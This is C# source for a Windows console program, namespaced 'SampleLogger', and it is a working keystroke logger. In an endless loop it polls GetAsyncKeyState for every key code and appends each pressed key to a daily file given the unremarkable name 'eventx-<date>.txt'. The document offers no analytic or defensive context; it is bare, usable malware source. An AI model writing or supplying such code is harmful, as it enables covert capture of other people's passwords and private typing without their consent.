using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SampleLogger
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int key);
        static void Main(string[] args)
        {
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        StreamWriter writer = File.AppendText($"eventx-{DateTime.Now:yyyy-MM-dd}.txt");
                        writer.Write((Keys)i);
                        writer.Dispose();
                        break;
                    }
                }
            }
        }
    }
}
